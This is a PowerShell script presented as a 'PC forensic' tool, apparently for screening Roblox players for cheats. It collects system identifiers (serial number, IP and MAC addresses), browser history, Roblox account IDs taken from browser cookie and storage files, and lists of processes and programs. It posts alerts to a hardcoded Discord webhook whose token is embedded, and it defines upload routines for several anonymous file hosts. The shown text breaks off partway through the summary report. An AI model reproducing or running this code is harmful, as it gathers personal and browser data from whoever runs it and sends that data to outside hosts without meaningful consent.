param(
    [string]$WebhookURL = "https://discord.com/api/webhooks/1469718055591346380/u8BSIT-aDsZeuAue-sOa8Wla3wLj0hWY9bKZCbgSIP7SMCS24ao64q_PJPsVsYi599Ku"
)

$ErrorActionPreference = "SilentlyContinue"

while (-not $WebhookURL -or $WebhookURL.Length -lt 20) {
    Write-Host "`n[!] Discord Webhook URL is REQUIRED" -ForegroundColor Red
    Write-Host "Get it from: Discord Server Settings > Integrations > Webhooks" -ForegroundColor Yellow
    Write-Host "Example: https://discord.com/api/webhooks/..." -ForegroundColor Cyan
    Write-Host "`nWebhook URL: " -ForegroundColor Green -NoNewline
    $WebhookURL = Read-Host
    
    if (-not $WebhookURL) {
        Write-Host "ERROR: You must provide a webhook URL to continue!" -ForegroundColor Red
    } elseif ($WebhookURL.Length -lt 20) {
        Write-Host "ERROR: Invalid webhook URL (too short)" -ForegroundColor Red
        $WebhookURL = ""
    }
}

Write-Host "`n✓ Webhook configured successfully!" -ForegroundColor Green
Start-Sleep -Seconds 1

$suspiciousPatterns = @("pot", "matrix", "newui", "matcha", "svchost1", "svc_host", "svc_host1", "svchost", "seliware", "potassium", "cryptic", "workspace")
$suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "wallhack", "esp", "triggerbot", "macro", "exploit", "trainer")

$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$outputDir = "$env:USERPROFILE\Desktop\PCForensics_$timestamp"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

$logFile = "$outputDir\FULL_LOG.txt"
$suspiciousItems = @()
$robloxAccounts = @()
$patternMatches = @()
$cfgFiles = @()
$exeFiles = @()

function Write-Log {
    param($Message, $Color = "White")
    Write-Host $Message -ForegroundColor $Color
    Add-Content -Path $logFile -Value $Message
}

function Get-Separator {
    return "`n" + ("=" * 80) + "`n"
}

function Send-DiscordMessage {
    param($Content, $Embeds = @())
    
    if (-not $WebhookURL) { return }
    
    try {
        $payload = @{
            content = $Content
            embeds = $Embeds
        } | ConvertTo-Json -Depth 10
        
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $payload -ContentType "application/json"
        Write-Log "✓ Discord message sent successfully" "Green"
    } catch {
        Write-Log "Failed to send Discord message: $_" "Red"
    }
}

function Upload-ToPixelDrain {
    param($FilePath)
    
    try {
        Write-Log "Attempting upload to pixeldrain.com..." "Yellow"
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        $bodyLines = @(
            "--$boundary"
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
            "Content-Type: application/octet-stream"
            ""
            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            "--$boundary--"
        )
        $body = $bodyLines -join "`r`n"
        
        $response = Invoke-RestMethod -Uri "https://pixeldrain.com/api/file/" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        
        if ($response.id) {
            $url = "https://pixeldrain.com/u/$($response.id)"
            Write-Log "✓ Pixeldrain upload successful!" "Green"
            Write-Log "URL: $url" "Cyan"
            return @{
                url = $url
                service = "Pixeldrain"
                expiry = "Never (until manually deleted)"
                success = $true
            }
        }
    } catch {
        Write-Log "Pixeldrain failed: $_" "Red"
        return @{ success = $false }
    }
}

function Upload-ToCatbox {
    param($FilePath)
    
    try {
        Write-Log "Attempting upload to catbox.moe..." "Yellow"
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        $bodyLines = @(
            "--$boundary"
            "Content-Disposition: form-data; name=`"reqtype`""
            ""
            "fileupload"
            "--$boundary"
            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`""
            "Content-Type: application/octet-stream"
            ""
            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            "--$boundary--"
        )
        $body = $bodyLines -join "`r`n"
        
        $response = Invoke-RestMethod -Uri "https://catbox.moe/user/api.php" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        
        if ($response -and $response.StartsWith("https://")) {
            Write-Log "✓ Catbox upload successful!" "Green"
            Write-Log "URL: $response" "Cyan"
            return @{
                url = $response
                service = "Catbox"
                expiry = "Never"
                success = $true
            }
        }
    } catch {
        Write-Log "Catbox failed: $_" "Red"
        return @{ success = $false }
    }
}

function Upload-To0x0 {
    param($FilePath)
    
    try {
        Write-Log "Attempting upload to 0x0.st..." "Yellow"
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        $bodyLines = @(
            "--$boundary"
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
            "Content-Type: application/octet-stream"
            ""
            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            "--$boundary--"
        )
        $body = $bodyLines -join "`r`n"
        
        $response = Invoke-RestMethod -Uri "https://0x0.st" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        
        if ($response -and $response.StartsWith("https://")) {
            $url = $response.Trim()
            Write-Log "✓ 0x0.st upload successful!" "Green"
            Write-Log "URL: $url" "Cyan"
            return @{
                url = $url
                service = "0x0.st"
                expiry = "365 days"
                success = $true
            }
        }
    } catch {
        Write-Log "0x0.st failed: $_" "Red"
        return @{ success = $false }
    }
}

function Upload-ToLitterbox {
    param($FilePath)
    
    try {
        Write-Log "Attempting upload to litterbox.catbox.moe (1hr expiry)..." "Yellow"
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        $bodyLines = @(
            "--$boundary"
            "Content-Disposition: form-data; name=`"reqtype`""
            ""
            "fileupload"
            "--$boundary"
            "Content-Disposition: form-data; name=`"time`""
            ""
            "1h"
            "--$boundary"
            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`""
            "Content-Type: application/octet-stream"
            ""
            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            "--$boundary--"
        )
        $body = $bodyLines -join "`r`n"
        
        $response = Invoke-RestMethod -Uri "https://litterbox.catbox.moe/resources/internals/api.php" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        
        if ($response -and $response.StartsWith("https://")) {
            Write-Log "✓ Litterbox upload successful!" "Green"
            Write-Log "URL: $response" "Cyan"
            Write-Log "WARNING: File expires in 1 hour!" "Yellow"
            return @{
                url = $response
                service = "Litterbox"
                expiry = "1 hour"
                success = $true
            }
        }
    } catch {
        Write-Log "Litterbox failed: $_" "Red"
        return @{ success = $false }
    }
}

function Upload-File {
    param($FilePath)
    
    Write-Log "`n$(Get-Separator)" "Cyan"
    Write-Log "UPLOADING RESULTS TO FILE HOSTING SERVICE" "Cyan"
    Write-Log "$(Get-Separator)" "Cyan"
    
    $services = @(
        @{ Name = "Pixeldrain"; Function = ${function:Upload-ToPixelDrain} }
        @{ Name = "Catbox"; Function = ${function:Upload-ToCatbox} }
        @{ Name = "0x0.st"; Function = ${function:Upload-To0x0} }
        @{ Name = "Litterbox"; Function = ${function:Upload-ToLitterbox} }
    )
    
    foreach ($service in $services) {
        Write-Log "`nTrying $($service.Name)..." "Yellow"
        $result = & $service.Function -FilePath $FilePath
        
        if ($result.success) {
            return $result
        }
    }
    
    Write-Log "`n❌ ALL UPLOAD SERVICES FAILED!" "Red"
    Write-Log "Results are saved locally only." "Yellow"
    return $null
}

function Search-Patterns {
    param($Text, $FilePath)
    
    $textLower = $Text.ToLower()
    
    foreach ($pattern in $suspiciousPatterns) {
        $patternLower = $pattern.ToLower()
        
        if ($textLower -like "*$patternLower*") {
            $match = "PATTERN MATCH [$pattern] in: $FilePath"
            
            if ($patternMatches -notcontains $match) {
                $script:patternMatches += $match
                Write-Log "  [!] Found pattern: $pattern" "Red"
            }
        }
    }
}

Write-Log "$(Get-Separator)" "Cyan"
Write-Log "ENHANCED PC FORENSIC & SYSTEM ANALYSIS TOOL v3.3" "Cyan"
Write-Log "Scan Started: $(Get-Date)" "Cyan"
Write-Log "Webhook: Configured ✓" "Green"
Write-Log "Scanning: ALL DRIVES (C:, D:, E:, etc.)" "Green"
Write-Log "Pattern Matching: Enhanced (partial match enabled)" "Green"
Write-Log "$(Get-Separator)" "Cyan"

Send-DiscordMessage -Content "🔍 **PC Forensic Scan Started**" -Embeds @(
    @{
        title = "Initializing Analysis v3.3"
        description = "Starting comprehensive ALL DRIVE scan with enhanced pattern matching..."
        color = 3447003
        fields = @(
            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
            @{ name = "User"; value = $env:USERNAME; inline = $true }
            @{ name = "Time"; value = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); inline = $false }
        )
        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
)

Write-Log "`n[*] Gathering Comprehensive System Information..." "Yellow"

$computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$bios = Get-CimInstance -ClassName Win32_BIOS
$processor = Get-CimInstance -ClassName Win32_Processor
$gpu = Get-CimInstance -ClassName Win32_VideoController
$network = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
$disk = Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }

$systemInfo = @{
    ComputerName = $computerSystem.Name
    Username = $env:USERNAME
    FullName = $computerSystem.UserName
    Domain = $computerSystem.Domain
    Manufacturer = $computerSystem.Manufacturer
    Model = $computerSystem.Model
    TotalRAM = [math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)
    
    OSName = $os.Caption
    OSVersion = $os.Version
    OSBuild = $os.BuildNumber
    OSArchitecture = $os.OSArchitecture
    InstallDate = $os.InstallDate
    LastBootTime = $os.LastBootUpTime
    Uptime = ((Get-Date) - $os.LastBootUpTime).ToString()
    SystemDrive = $os.SystemDrive
    WindowsDirectory = $os.WindowsDirectory
    
    BIOSVersion = $bios.SMBIOSBIOSVersion
    BIOSManufacturer = $bios.Manufacturer
    SerialNumber = $bios.SerialNumber
    BIOSReleaseDate = $bios.ReleaseDate
    
    ProcessorName = $processor.Name
    ProcessorCores = $processor.NumberOfCores
    ProcessorThreads = $processor.NumberOfLogicalProcessors
    
    GPUName = ($gpu | Select-Object -First 1).Name
    GPUDriverVersion = ($gpu | Select-Object -First 1).DriverVersion
    
    IPAddress = ($network | Select-Object -First 1).IPAddress[0]
    MACAddress = ($network | Select-Object -First 1).MACAddress
    DHCPEnabled = ($network | Select-Object -First 1).DHCPEnabled
    DHCPServer = ($network | Select-Object -First 1).DHCPServer
    DNSServers = (($network | Select-Object -First 1).DNSServerSearchOrder -join ", ")
    
    TimeZone = (Get-TimeZone).DisplayName
    CurrentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    UserProfile = $env:USERPROFILE
    TempFolder = $env:TEMP
    ProgramFiles = $env:ProgramFiles
    LocalAppData = $env:LOCALAPPDATA
    AppData = $env:APPDATA
}

Write-Log "`nSystem Information:"
$systemInfo.GetEnumerator() | Sort-Object Key | ForEach-Object {
    Write-Log "  $($_.Key): $($_.Value)"
}

Write-Log "`nDetecting All Available Drives..."
$allDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
Write-Log "Found drives: $($allDrives.Name -join ', ')" "Cyan"

Write-Log "`nDisk Information:"
$disk | ForEach-Object {
    Write-Log "  Drive $($_.DeviceID)"
    Write-Log "    Size: $([math]::Round($_.Size / 1GB, 2)) GB"
    Write-Log "    Free: $([math]::Round($_.FreeSpace / 1GB, 2)) GB"
    Write-Log "    Used: $([math]::Round(($_.Size - $_.FreeSpace) / 1GB, 2)) GB"
}

Write-Log "`n[*] Searching for Specific Patterns (Enhanced Matching - ALL DRIVES)..." "Yellow"
Write-Log "Patterns: $($suspiciousPatterns -join ', ')" "Cyan"
Write-Log "Note: Will match partial occurrences (e.g., 'pota' matches 'pot')" "Yellow"

$patternFile = "$outputDir\PATTERN_MATCHES.txt"
"=== PATTERN SEARCH RESULTS (Enhanced Matching - ALL DRIVES) ===" | Out-File $patternFile
"Searching for: $($suspiciousPatterns -join ', ')" | Add-Content $patternFile
"Pattern matching is case-insensitive and matches partial occurrences" | Add-Content $patternFile
"Scanning ALL drives: $($allDrives.Name -join ', ')" | Add-Content $patternFile
"" | Add-Content $patternFile

$searchLocations = @()
foreach ($drive in $allDrives) {
    $driveLetter = $drive.Name
    $searchLocations += @(
        "${driveLetter}:\Users",
        "${driveLetter}:\Program Files",
        "${driveLetter}:\Program Files (x86)",
        "${driveLetter}:\ProgramData",
        "${driveLetter}:\Downloads",
        "${driveLetter}:\Games",
        "${driveLetter}:\Cheats",
        "${driveLetter}:\Temp",
        "${driveLetter}:\Documents"
    )
}

$searchLocations += @(
    $env:APPDATA,
    $env:LOCALAPPDATA,
    $env:TEMP,
    "$env:LOCALAPPDATA\Temp",
    "C:\Windows\Temp",
    "C:\Windows\Prefetch",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop"
)

foreach ($location in $searchLocations) {
    if (Test-Path $location) {
        Write-Log "`nScanning: $location" "Yellow"
        
        Get-ChildItem -Path $location -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
            $filePath = $_.FullName
            $fileName = $_.Name
            
            Search-Patterns -Text $fileName -FilePath $filePath
            
            if ($_.Extension -match '\.(txt|log|ini|cfg|json|xml)$') {
                try {
                    $content = Get-Content $filePath -Raw -ErrorAction SilentlyContinue
                    if ($content) {
                        Search-Patterns -Text $content -FilePath $filePath
                    }
                } catch {}
            }
        }
    }
}

$patternMatches | ForEach-Object { Add-Content -Path $patternFile -Value $_ }

Write-Log "`nTotal pattern matches: $($patternMatches.Count)" "Cyan"
Write-Log "Pattern results saved to: $patternFile" "Green"

Write-Log "`n[*] Searching for ALL .cfg Files (ALL DRIVES)..." "Yellow"

$cfgFile = "$outputDir\CFG_FILES.txt"
"=== ALL .CFG FILES FOUND (ALL DRIVES) ===" | Out-File $cfgFile

$cfgSearchPaths = @()
foreach ($drive in $allDrives) {
    $driveLetter = $drive.Name
    $cfgSearchPaths += @(
        "${driveLetter}:\",
        "${driveLetter}:\Users",
        "${driveLetter}:\Program Files",
        "${driveLetter}:\Program Files (x86)",
        "${driveLetter}:\Games",
        "${driveLetter}:\Cheats"
    )
}

$cfgSearchPaths += @(
    $env:APPDATA,
    $env:LOCALAPPDATA,
    $env:TEMP,
    "$env:LOCALAPPDATA\Temp",
    "C:\Windows\Temp",
    $env:ProgramFiles,
    "${env:ProgramFiles(x86)}",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop",
    "C:\Windows\Prefetch"
)

foreach ($path in $cfgSearchPaths) {
    if (Test-Path $path) {
        Write-Log "Scanning for .cfg in: $path" "Yellow"
        Add-Content -Path $cfgFile -Value "`n=== $path ==="
        
        Get-ChildItem -Path $path -Filter "*.cfg" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $cfgInfo = "$($_.LastWriteTime) | $($_.Length) bytes | $($_.FullName)"
            $cfgFiles += $cfgInfo
            Add-Content -Path $cfgFile -Value $cfgInfo
            
            Search-Patterns -Text $_.Name -FilePath $_.FullName
            try {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                if ($content) {
                    Search-Patterns -Text $content -FilePath $_.FullName
                }
            } catch {}
        }
    }
}

Write-Log "Total .cfg files found: $($cfgFiles.Count)" "Cyan"
Write-Log ".cfg files saved to: $cfgFile" "Green"

Write-Log "`n[*] Searching for ALL .exe Files (ALL DRIVES)..." "Yellow"

$exeFile = "$outputDir\EXE_FILES.txt"
"=== ALL .EXE FILES FOUND (ALL DRIVES) ===" | Out-File $exeFile

Write-Log "Checking shell:recent..." "Yellow"
Add-Content -Path $exeFile -Value "`n=== RECENT ITEMS (shell:recent) ==="
$recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Filter "*.lnk" -Force -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $shell = New-Object -ComObject WScript.Shell
            $shortcut = $shell.CreateShortcut($_.FullName)
            if ($shortcut.TargetPath -match '\.exe$') {
                $exeInfo = "$($_.LastWriteTime) | Recent: $($shortcut.TargetPath)"
                $exeFiles += $exeInfo
                Add-Content -Path $exeFile -Value $exeInfo
                
                Search-Patterns -Text $shortcut.TargetPath -FilePath "Recent:$($_.Name)"
            }
        } catch {}
    }
}

$exeSearchPaths = @()
foreach ($drive in $allDrives) {
    $driveLetter = $drive.Name
    $exeSearchPaths += @(
        "${driveLetter}:\Users",
        "${driveLetter}:\Program Files",
        "${driveLetter}:\Program Files (x86)",
        "${driveLetter}:\Games",
        "${driveLetter}:\Cheats",
        "${driveLetter}:\Downloads"
    )
}

$exeSearchPaths += @(
    $env:APPDATA,
    $env:LOCALAPPDATA,
    $env:TEMP,
    "$env:LOCALAPPDATA\Temp",
    "C:\Windows\Temp",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop",
    "C:\Windows\Prefetch"
)

foreach ($path in $exeSearchPaths) {
    if (Test-Path $path) {
        Write-Log "Scanning for .exe in: $path" "Yellow"
        Add-Content -Path $exeFile -Value "`n=== $path ==="
        
        Get-ChildItem -Path $path -Filter "*.exe" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
            $exeInfo = "$($_.LastWriteTime) | $($_.Length) bytes | $($_.FullName)"
            $exeFiles += $exeInfo
            Add-Content -Path $exeFile -Value $exeInfo
            
            Search-Patterns -Text $_.FullName -FilePath $_.FullName
            Search-Patterns -Text $_.Name -FilePath $_.FullName
            
            foreach ($keyword in $suspiciousKeywords) {
                if ($_.Name -like "*$keyword*") {
                    $suspiciousItems += "EXE: $($_.FullName)"
                }
            }
        }
    }
}

Write-Log "Analyzing Prefetch for executed .exe..." "Yellow"
Add-Content -Path $exeFile -Value "`n=== PREFETCH (Executed Programs) ==="
if (Test-Path "C:\Windows\Prefetch") {
    Get-ChildItem -Path "C:\Windows\Prefetch" -Filter "*.pf" -ErrorAction SilentlyContinue | ForEach-Object {
        $exeInfo = "$($_.LastWriteTime) | Prefetch: $($_.Name)"
        $exeFiles += $exeInfo
        Add-Content -Path $exeFile -Value $exeInfo
        
        Search-Patterns -Text $_.Name -FilePath "Prefetch:$($_.Name)"
    }
}

Write-Log "Total .exe files found: $($exeFiles.Count)" "Cyan"
Write-Log ".exe files saved to: $exeFile" "Green"

Write-Log "`n[*] Searching for Roblox Accounts..." "Yellow"

$robloxFile = "$outputDir\ROBLOX_ACCOUNTS.txt"
"=== ROBLOX ACCOUNTS FOUND ===" | Out-File $robloxFile

$robloxAppDataPaths = @(
    "$env:LOCALAPPDATA\Roblox\logs",
    "$env:LOCALAPPDATA\Roblox\LocalStorage",
    "$env:APPDATA\Roblox",
    "$env:LOCALAPPDATA\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\LocalState",
    "$env:LOCALAPPDATA\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\AC\INetCookies"
)

Write-Log "Checking Roblox Application Data..."
foreach ($path in $robloxAppDataPaths) {
    if (Test-Path $path) {
        Write-Log "Found Roblox data at: $path" "Green"
        Add-Content -Path $robloxFile -Value "`n=== $path ==="
        
        Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                
                if ($content -match 'userId["\s:]+(\d{8,12})') {
                    $userId = $matches[1]
                    $accountInfo = "User ID: $userId (from $($_.Name))"
                    if ($robloxAccounts -notcontains $accountInfo) {
                        Add-Content -Path $robloxFile -Value $accountInfo
                        $robloxAccounts += $accountInfo
                        Write-Log "  Found User ID: $userId" "Green"
                    }
                }
                
                if ($content -match 'username["\s:]+([a-zA-Z0-9_]{3,20})') {
                    $username = $matches[1]
                    $accountInfo = "Username: $username (from $($_.Name))"
                    if ($robloxAccounts -notcontains $accountInfo) {
                        Add-Content -Path $robloxFile -Value $accountInfo
                        $robloxAccounts += $accountInfo
                        Write-Log "  Found Username: $username" "Green"
                    }
                }
            } catch {}
        }
    }
}

$browserPaths = @{
    "Chrome" = @{
        "Cookies" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        "LocalStorage" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
    }
    "Edge" = @{
        "Cookies" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
        "LocalStorage" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    }
    "Brave" = @{
        "Cookies" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
        "LocalStorage" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
    }
    "Mullvad" = @{
        "Cookies" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\cookies.sqlite"
        "LocalStorage" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\webappsstore.sqlite"
    }
    "Firefox" = @{
        "Cookies" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\cookies.sqlite"
        "LocalStorage" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\webappsstore.sqlite"
    }
}

Write-Log "Checking Browser Data for Roblox Accounts..."
foreach ($browser in $browserPaths.GetEnumerator()) {
    Write-Log "Scanning $($browser.Key)..." "Yellow"
    
    foreach ($dataType in $browser.Value.GetEnumerator()) {
        $paths = Get-ChildItem -Path $dataType.Value -ErrorAction SilentlyContinue
        
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Write-Log "  Found: $($dataType.Key)" "Green"
                Add-Content -Path $robloxFile -Value "`n[$($browser.Key) - $($dataType.Key)]"
                
                try {
                    if ($path -like "*.sqlite") {
                        $content = Get-Content $path -Raw -Encoding Byte -ErrorAction SilentlyContinue
                        $textContent = [System.Text.Encoding]::ASCII.GetString($content)
                        
                        if ($textContent -match 'roblox') {
                            $userIds = [regex]::Matches($textContent, '\d{8,12}') | Select-Object -ExpandProperty Value -Unique
                            foreach ($id in $userIds) {
                                if ($id -match '^\d{8,12}$') {
                                    $accountInfo = "User ID: $id (from $($browser.Key))"
                                    if ($robloxAccounts -notcontains $accountInfo) {
                                        Add-Content -Path $robloxFile -Value "  $accountInfo"
                                        $robloxAccounts += $accountInfo
                                    }
                                }
                            }
                        }
                    }
                    elseif ($dataType.Key -eq "LocalStorage") {
                        Get-ChildItem -Path $path -Filter "*.log" -ErrorAction SilentlyContinue | ForEach-Object {
                            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                            if ($content -match 'roblox') {
                                if ($content -match 'userId["\s:]+(\d{8,12})') {
                                    $userId = $matches[1]
                                    $accountInfo = "User ID: $userId (from $($browser.Key))"
                                    if ($robloxAccounts -notcontains $accountInfo) {
                                        Add-Content -Path $robloxFile -Value "  $accountInfo"
                                        $robloxAccounts += $accountInfo
                                        Write-Log "    Found User ID: $userId" "Green"
                                    }
                                }
                                
                                if ($content -match '"username":"([a-zA-Z0-9_]{3,20})"') {
                                    $username = $matches[1]
                                    $accountInfo = "Username: $username (from $($browser.Key))"
                                    if ($robloxAccounts -notcontains $accountInfo) {
                                        Add-Content -Path $robloxFile -Value "  $accountInfo"
                                        $robloxAccounts += $accountInfo
                                        Write-Log "    Found Username: $username" "Green"
                                    }
                                }
                            }
                        }
                    }
                } catch {}
            }
        }
    }
}

Write-Log "Total Roblox accounts found: $($robloxAccounts.Count)" "Cyan"

Write-Log "`n[*] Extracting Browser History..." "Yellow"

$browserHistoryFile = "$outputDir\BROWSER_HISTORY.txt"
"=== BROWSER HISTORY ===" | Out-File $browserHistoryFile

$historyPaths = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
    "Mullvad" = "$env:LOCALAPPDATA\Mullvad Browser\Profiles\*\places.sqlite"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles\*\places.sqlite"
}

foreach ($browser in $historyPaths.GetEnumerator()) {
    $paths = Get-ChildItem -Path $browser.Value -ErrorAction SilentlyContinue
    
    foreach ($historyPath in $paths) {
        if (Test-Path $historyPath) {
            Write-Log "Extracting $($browser.Key) history..." "Yellow"
            Add-Content -Path $browserHistoryFile -Value "`n=== $($browser.Key) History ==="
            
            $tempDb = "$env:TEMP\history_temp_$(Get-Random).db"
            Copy-Item $historyPath $tempDb -ErrorAction SilentlyContinue
            
            if (Test-Path $tempDb) {
                try {
                    $content = Get-Content $tempDb -Raw -Encoding Byte -ErrorAction SilentlyContinue
                    $textContent = [System.Text.Encoding]::ASCII.GetString($content)
                    
                    $urls = [regex]::Matches($textContent, 'https?://[^\s\x00-\x1F"]+') | 
                            Select-Object -ExpandProperty Value -Unique | 
                            Where-Object { $_ -match '^https?://' } |
                            Select-Object -First 300
                    
                    Add-Content -Path $browserHistoryFile -Value "Found $($urls.Count) URLs:"
                    $urls | ForEach-Object { Add-Content -Path $browserHistoryFile -Value "  $_" }
                } catch {}
                
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

Write-Log "Browser history saved to: $browserHistoryFile" "Green"

Write-Log "`n[*] Scanning for Deleted Files..." "Yellow"

$deletedFile = "$outputDir\DELETED_FILES.txt"
"=== DELETED FILES ===" | Out-File $deletedFile

$sid = (Get-CimInstance Win32_UserAccount | Where-Object {$_.Name -eq $env:USERNAME}).SID
$recycleBinPath = "$env:SystemDrive\`$Recycle.Bin\$sid"

if (Test-Path $recycleBinPath) {
    Write-Log "Scanning Recycle Bin..." "Yellow"
    Get-ChildItem -Path $recycleBinPath -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
        $deletedInfo = "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes - $($_.FullName)"
        Add-Content -Path $deletedFile -Value $deletedInfo
        
        Search-Patterns -Text $_.Name -FilePath "RecycleBin:$($_.Name)"
        
        foreach ($keyword in $suspiciousKeywords) {
            if ($_.Name -like "*$keyword*") {
                $suspiciousItems += "DELETED: $deletedInfo"
            }
        }
    }
}

Write-Log "Deleted files saved to: $deletedFile" "Green"

Write-Log "`n[*] Analyzing MUICache..." "Yellow"
$muiFile = "$outputDir\MUICACHE.txt"
"=== MUICACHE (Application Execution History) ===" | Out-File $muiFile

@("HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache") | ForEach-Object {
    if (Test-Path $_) {
        (Get-ItemProperty $_ -EA 0).PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {
            $entry = "$($_.Name)=$($_.Value)"
            Add-Content -Path $muiFile -Value $entry
            Search-Patterns -Text "$($_.Name) $($_.Value)" -FilePath "MUICache"
        }
    }
}
Write-Log "MUICache saved to: $muiFile" "Green"

Write-Log "`n[*] Analyzing Running Processes..." "Yellow"
$processFile = "$outputDir\PROCESSES.txt"
"=== RUNNING PROCESSES ===" | Out-File $processFile

Get-Process | Sort-Object CPU -Descending | ForEach-Object {
    $procInfo = "$($_.ProcessName) - PID:$($_.Id) - CPU:$($_.CPU) - $($_.Path)"
    Add-Content -Path $processFile -Value $procInfo
    Search-Patterns -Text "$($_.ProcessName) $($_.Path)" -FilePath "Process:$($_.ProcessName)"
}
Write-Log "Processes saved to: $processFile" "Green"

Write-Log "`n[*] Gathering Installed Programs..." "Yellow"
$programsFile = "$outputDir\PROGRAMS.txt"
"=== INSTALLED PROGRAMS ===" | Out-File $programsFile

Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
                 HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -EA 0 |
Where-Object { $_.DisplayName } | Sort-Object DisplayName | ForEach-Object {
    $progInfo = "$($_.DisplayName) - Version: $($_.DisplayVersion) - Publisher: $($_.Publisher)"
    Add-Content -Path $programsFile -Value $progInfo
    Search-Patterns -Text $_.DisplayName -FilePath "Program:$($_.DisplayName)"
}
Write-Log "Programs saved to: $programsFile" "Green"

Write-Log "`n[*] Creating Summary Report..." "Yellow"

$summaryFile = "$outputDir\SUMMARY_REPORT.txt"
$isSuspicious = ($suspiciousItems.Count -gt 0) -or ($patternMatches.Count -gt 0)

$summary = @"
==============================================================================
                    PC FORENSIC ANALYSIS SUMMARY v3.3
==============================================================================

Scan Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Computer: $($systemInfo.ComputerName)
User: $($systemInfo.Username)
Status: $(if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✓ No obvious threats" })

Drives Scanned: $($allDrives.Name -join ', ')
Pattern Matching: Enhanced (partial match - e.g., 'pota' matches 'pot')

==============================================================================
SYSTEM DETAILS
==============================================================================

OS: $($systemInfo.OSName) ($($systemInfo.OSBuild))
Architecture: $($systemInfo.OSArchitecture)
Install Date: $($systemInfo.InstallDate)
